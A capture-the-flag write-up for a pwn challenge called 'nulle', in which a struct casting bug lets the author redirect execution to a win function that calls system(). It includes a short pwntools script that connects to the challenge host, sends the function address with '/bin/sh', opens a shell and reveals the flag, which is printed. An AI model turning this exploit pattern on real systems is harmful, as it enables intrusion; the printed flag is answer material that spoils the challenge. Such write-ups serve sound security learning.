nulle  
Category: Pwn  

Description: Our developer got a bit too clever with C structs. They decided that if two structs have the same fields, just in a different order, it’s fine to cast between them.  

Link to the challenge: https://app.cyber-edu.co/challenges/9fc63e6a-404f-447c-b041-ec2ab0a1d450?tenant=cyberedu  

For this ctf, I had to write a simple exploit by calling the win function, which had a system() function, which the binary wasn't calling by itself.  

Firstly, I tried to get more information about the binary.   

<img width="1092" height="58" alt="image" src="https://github.com/user-attachments/assets/3bf58d16-9163-4307-9700-80c6b41f4678" />  
<br>
<img width="282" height="158" alt="image" src="https://github.com/user-attachments/assets/04bebc89-71d3-41dc-bb6b-3eb193701244" />  
<br>
I saw `No PIE` and I knew I had to analyze this statically.  
<br>
<img width="487" height="777" alt="image" src="https://github.com/user-attachments/assets/9946df86-fc8c-4742-a438-052f51cc0810" />  

I decompiled this binary using Ghidra, and this is the main function.  

<img width="281" height="224" alt="image" src="https://github.com/user-attachments/assets/9c2be8eb-4550-476e-913f-6d78741f6b72" />  

at 0x4011b6 was the function which I had to call, because it contains system() function.  

<img width="1111" height="437" alt="image" src="https://github.com/user-attachments/assets/e403d32d-9c2d-4268-901a-628342657522" />

I made a simple python script using pwntools to call that specific function, and to execute an interactive shell.  

```
from pwn import *

r = remote("34.159.137.78",31868)

payload = p64(0x4011b6)
payload += b"/bin/sh"

r.sendlineafter(b"temp", payload)
r.interactive()
```

After running this script, I got reverse shell to the instance. Now I only had to see where the flag is.  
I used cd into /home/solver, and after using ls I found the flag.  

<img width="886" height="194" alt="image" src="https://github.com/user-attachments/assets/7f950a5a-5dc8-4ed7-bae3-2c4a8f1124b2" />

Flag: `CTF{53c4abb4d8484a0dceb0840356114dc43dabc0855ae22d84ae5bba996aa54c0a}`


